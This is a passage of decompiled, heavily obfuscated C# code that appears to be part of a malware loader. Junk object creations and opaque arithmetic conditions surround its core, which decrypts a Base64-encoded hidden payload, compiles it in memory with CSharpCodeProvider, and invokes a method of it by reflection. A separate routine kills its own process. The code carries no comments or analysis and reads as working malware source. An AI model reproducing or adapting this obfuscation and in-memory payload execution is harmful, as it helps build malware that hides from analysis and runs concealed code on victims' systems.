			num49 = num49 + sizeof(double) + Convert.ToInt32(4684.0 + Math.Abs(4684.0));
		}
		Convert.ToInt32(1125857920.0);
		int num50 = Convert.ToInt32(1125856613.8513372 + Math.Log(562928317.0));
		if ((Convert.ToInt32(121873.0 + Math.Tanh(60937.0)) ^ Convert.ToInt32(489611.0)) == Convert.ToInt32(435352.7454119009 - Math.Cos(217676.5)))
		{
			Convert.ToInt32(1.0 + Math.Sqrt(1.0));
			num50 = num50 + sizeof(double) + Convert.ToInt32(1278.0);
		}
		num46 = num48 + (num49 ^ num50);
		new Stack<long>();
		num47 += (uint)Convert.ToInt32(827729.4869497222 + Math.Sin(413864.5));
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		new Process();
		new Random();
		new ManagementObjectSearcher();
		new ManagementObjectSearcher();
		List<string> list = new List<string>();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		new ManagementObjectSearcher();
		new List<double>();
		new PerformanceCounter();
		new ManagementClass();
		new EventLog();
		new ManagementObject();
		new FileSystemWatcher();
		Assembly[] array13 = assemblies;
		int num51 = -5340;
		if ((Convert.ToInt32(943060.1560305037 - Math.Cos(471530.5)) ^ Convert.ToInt32(488934.406811066 - Math.Log(244461.0))) == Convert.ToInt32(893206.5 - Math.Abs(297735.5)))
		{
			num51 = num51 + sizeof(double) + Convert.ToInt32(5332.0);
		}
		int num52 = num51;
		while (num52 < array13.Length)
		{
			Assembly assembly = array13[num52];
			if (!assembly.IsDynamic)
			{
				list.Add(assembly.Location);
			}
			int num53 = num52;
			int num54 = Convert.ToInt32(-8463.0);
			if ((Convert.ToInt32(970178.0) ^ Convert.ToInt32(412783.68530187994 + Math.Log10(206394.5))) == Convert.ToInt32(556967.0345655254 + Math.Sqrt(278747.5)))
			{
				Convert.ToInt32(2.0);
				num54 = num54 + sizeof(double) + Convert.ToInt32(8455.165577225269 + Math.Cos(4228.0));
			}
			num52 = num53 + num54;
		}
		new ManagementClass();
		new List<int>();
		new ProcessStartInfo();
		new EventLog();
		int num55 = Convert.ToInt32(917296.0 - Math.Truncate(305765.5));
		new Ping();
		new ManagementObjectSearcher();
		string text9 = _003CModule_003E.Qf((string)_003CModule_003E.smethod_3());
		num55 += Convert.ToInt32(841265.9495005455 - Math.Log(420626.5));
		text9 += Convert.ToInt32(1367490.0 - Math.Abs(455830.0));
		new FileSystemWatcher();
		text9 += Convert.ToInt32(98413.19610722482 + Math.Log(49212.0));
		string[] array14 = list.ToArray();
		new List<double>();
		new ManagementClass();
		new ManagementClass();
		new PerformanceCounter();
		new ManagementClass();
		new Ping();
		new Ping();
		new ManagementObjectSearcher();
		new Stack<uint>();
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		ulong num56 = (ulong)Convert.ToInt32(942115.5 - Math.Abs(314038.5));
		num56 += (ulong)Convert.ToInt32(260535.0 - Math.Floor(86845.0));
		new ManagementClass();
		new SerialPort();
		new SerialPort();
		new Process();
		new Process();
		new Ping();
		new ProcessStartInfo();
		new EventLog();
		new List<float>();
		CompilerParameters val2 = new CompilerParameters(array14);
		int num57 = Convert.ToInt32(-5645.0);
		if ((Convert.ToInt32(507401.88578675187 + Math.Cos(253701.0)) ^ Convert.ToInt32(559892.2468564265 - Math.Cos(279946.0))) == Convert.ToInt32(1494957.0 - Math.Abs(498319.0)))
		{
			Convert.ToInt32(1.1585290151921035 + Math.Sin(1.0));
			num57 = num57 + sizeof(double) + Convert.ToInt32(8457.0 - Math.Ceiling(2819.0));
		}
		val2.set_GenerateInMemory((byte)num57 != 0);
		int num58 = Convert.ToInt32(-1860.0);
		if ((Convert.ToInt32(450108.0 + Math.Ceiling(450108.0)) ^ Convert.ToInt32(549716.0588050721 - Math.Tan(274858.0))) == Convert.ToInt32(384812.0))
		{
			Convert.ToInt32(1.2384058440442351 + Math.Tanh(1.0));
			num58 = num58 + sizeof(double) + Convert.ToInt32(1852.0);
		}
		val2.set_GenerateExecutable((byte)num58 != 0);
		CompilerParameters val3 = val2;
		new List<int>();
		new ManagementClass();
		new List<float>();
		new SerialPort();
		new ProcessStartInfo();
		CompilerResults val4 = val.CompileAssemblyFromSource(val3, Encoding.UTF8.GetString(Convert.FromBase64String(_003CModule_003E.Qf((string)_003CModule_003E.smethod_4()))));
		new ManagementObjectSearcher();
		new Process();
		new ManagementEventWatcher();
		new PerformanceCounter();
		Assembly compiledAssembly = val4.get_CompiledAssembly();
		new Process();
		new EventLog();
		new Random();
		new List<uint>();
		Type type = compiledAssembly.GetType(_003CModule_003E.Qf((string)_003CModule_003E.smethod_5()));
		new ManagementEventWatcher();
		new ManagementClass();
		new FileSystemWatcher();
		new EventLog();
		new Process();
		new List<uint>();
		new SerialPort();
		new PerformanceCounter();
		MethodInfo method = type.GetMethod(_003CModule_003E.Qf((string)_003CModule_003E.smethod_6()));
		new ManagementObject();
		new SerialPort();
		new ManagementObject();
		new List<uint>();
		new FileSystemWatcher();
		byte[] array15 = new byte[Convert.ToInt32(80931.0 - Math.Round(26977.0))];
		try
		{
			Array.Reverse((Array)array15);
		}
		catch
		{
		}
		new Stack<double>();
		new ManagementClass();
		new Process();
		new EventLog();
		int num59 = -6145;
		if ((Convert.ToInt32(314702.0 + Math.Ceiling(314702.5)) ^ Convert.ToInt32(141744.0)) == Convert.ToInt32(766765.0))
		{
			Convert.ToInt32(2.0);
			num59 = num59 + sizeof(double) + Convert.ToInt32(6138.0);
		}
		object[] array16 = new object[num59];
		int num60 = Convert.ToInt32(-6753.0);
		if ((Convert.ToInt32(458440.0) ^ Convert.ToInt32(919214.0)) == Convert.ToInt32(587879.4750911323 + Math.Tan(293939.0)))
		{
			Convert.ToInt32(1.0 + Math.Abs(1.0));
			num60 = num60 + sizeof(double) + Convert.ToInt32(3253.030749706995 - Math.Tan(3372.5));
		}
		array16[num60] = array12;
		method.Invoke(null, array16);
		uint num61 = (uint)Convert.ToInt32(182197.0 + Math.Truncate(182197.0));
		new ManagementObject();
		new SerialPort();
		new ProcessStartInfo();
		new Random();
		new List<int>();
		new EventLog();
		num61 += (uint)Convert.ToInt32(445675.0 - Math.Truncate(148558.5));
		new SerialPort();
		new List<float>();
		new ManagementObjectSearcher();
		new ManagementObject();
		new List<string>();
		new FileSystemWatcher();
	}

	private unsafe static void tF()
	{
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			int num = -5765;
			if ((Convert.ToInt32(20498.010596736207 - Math.Log10(10247.0)) ^ Convert.ToInt32(1462000.0 - Math.Truncate(487333.5))) == Convert.ToInt32(954181.0))
			{
				Convert.ToInt32(3.0 - Math.Round(1.0));
				num = num + sizeof(double) + Convert.ToInt32(5753.540833766209 + Math.Log10(2878.5));
			}
			Environment.Exit(num);
		}
	}
}
